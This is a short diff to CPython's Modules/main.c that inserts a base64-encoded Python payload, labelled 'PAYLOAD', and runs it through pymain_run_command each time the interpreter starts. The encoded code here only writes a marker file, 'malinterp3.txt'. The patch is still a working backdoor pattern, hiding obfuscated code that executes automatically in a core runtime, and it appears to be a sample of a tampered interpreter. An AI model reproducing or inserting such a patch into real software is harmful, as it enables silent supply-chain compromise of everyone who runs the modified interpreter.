@@ -1,0 +1,15 @@
+diff --git a/Modules/main.c b/Modules/main.c
+index 6904e3f..67a43d7 100644
+--- a/Modules/main.c
++++ b/Modules/main.c
+@@ -550,6 +550,10 @@ pymain_run_python(int *exitcode)
+         goto error;
+     }
+ 
++    // PAYLOAD: base64-encoded payload
++    wchar_t payload[] = L"__import__('builtins').exec(__import__('builtins').compile(__import__('base64').b64decode(b'd2l0aCBvcGVuKCdtYWxpbnRlcnAzLnR4dCcsICd3JykgYXMgZjogZi53cml0ZSgnTWFsUHl0aG9uIEludGVycHJldGVyJykK'),'<string>','exec'))";
++    pymain_run_command(payload);
++
+     if (config->run_filename != NULL) {
+         /* If filename is a package (ex: directory or ZIP file) which contains
+            __main__.py, main_importer_path is set to filename and will be
